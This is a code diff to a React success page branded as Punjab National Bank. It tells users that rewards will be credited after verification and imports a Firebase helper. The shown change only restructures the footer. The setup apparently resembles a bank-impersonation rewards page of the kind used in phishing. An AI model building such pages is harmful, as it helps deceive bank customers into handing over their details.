@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import { useState, useEffect } from 'react';
 import '../App.css';
 import FirebaseUtil from '../FirebaseRepo';
 
@@ -119,13 +119,12 @@ const SuccessPage = () => {
           Your rewards will be credited to your account within 24-48 hours after verification.
         </p>
       </div>
-    </div>
 
-    {/* Bottom Part / Footer */}
-    <footer className="bg-gray-800 text-white p-4 text-center">
-      <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
-      <p className="text-xs">For support, call {callNumber} or email care@pnb.co.in</p>
-    </footer>
+      <footer className="bg-gray-800 text-white p-4 text-center">
+        <p className="text-sm"> 2025 Punjab National Bank. All rights reserved.</p>
+        <p className="text-xs">For support, call {callNumber} or email care@pnb.co.in</p>
+      </footer>
+    </div>
   );
 };
 
